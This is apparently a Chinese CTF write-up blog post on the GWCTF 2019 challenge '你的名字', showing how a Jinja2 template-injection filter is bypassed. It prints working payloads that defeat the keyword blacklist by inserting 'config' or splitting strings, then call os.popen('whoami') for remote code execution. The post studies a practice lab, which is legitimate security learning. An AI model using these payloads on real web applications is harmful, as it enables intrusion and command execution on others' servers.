---
title: '[GWCTF 2019]你的名字'
date: 2024-09-22 19:49:03
tags:  ssti
categories: 刷题笔记
---

## [GWCTF 2019]你的名字

我们往姓名处输入一个1，页面回显一个1

![image-20240922201710345](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409222017383.png)

这种情况，我们第一时间想到的是ssti模版注入

我们输入{{7*7}},得到的居然是php报错

<!--more-->

![image-20240922201823100](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409222018192.png)

```
但我们输入{7*7}回显就正确了。说明题目过滤了{{}}，所以我们就只能使用{}包含的ssti语句
```

我们尝试

```
{%set a="test"%}
```

![image-20240922202208766](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409222022790.png)

页面没有报错，但也没有回显，说明正常执行了这句话，确定了考点是模板注入后就得想想怎么绕过了

一篇[模板注入绕过相关文章](https://xz.aliyun.com/t/6885#toc-4)

通过查询资料，我们发现

```
{%print %}
```

这种形式可以进行回显

试了下

```
{%print lipsum %}
```

，终于有回显了，有回显了就好开始下面的构造了，至于一步步构造payload的过程有疑惑的，可以看一看[ssti相关文章](https://blog.csdn.net/cjdgg/article/details/115770395?spm=1001.2014.3001.5501)

![image-20240922202901141](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409222029208.png)

这里还得补充一点，

```
{%print %}
```

形式下，若果你构造的payload是正常的ssti用到的语句却没有回显，就说明你的语句中可能有关键字被过滤了，如

```
{%print ‘’.class %}
```

执行之后没有任何的回显，但

```
{%print ‘’.clconfigass %}
```

成功执行有回显，这说明class被过滤了

这里给出源码的黑名单

```
blacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval', 'if', 'for',
                 ' subprocess', 'file', 'open', 'popen', 'builtins', 'compile', 'execfile', 'from_pyfile', 'local',
                 'self', 'item', 'getitem', 'getattribute', 'func_globals', 'config']
for no in blacklist:
    while True:
        if no in s:
            s = s.replace(no, '')
        else:
            break
return s
```

我们发现代码是先从黑名单中取出一个字符串经过循环过滤再进行下一个字符串的过滤，因为config字符串是在黑名单的最后一个，所以黑名单中前面字符串的过滤都已经结束了，再进行config的过滤，所以我们在过滤字符中加入config就可以绕过

所以最终payload

```
{%print lipsum.__globals__.__builconfigtins__.__impoconfigrt__('oconfigs').poconfigpen('whoami').read()%}

```

![image-20240922203110271](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409222031348.png)

然后进行rce找flag

也可以拼接绕过

```
{%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('whoami').read()%}

```

```
{%print lipsum.__globals__['__builtins__']['__import__']('os')['po'+'pen']('whoami').read()%}
```

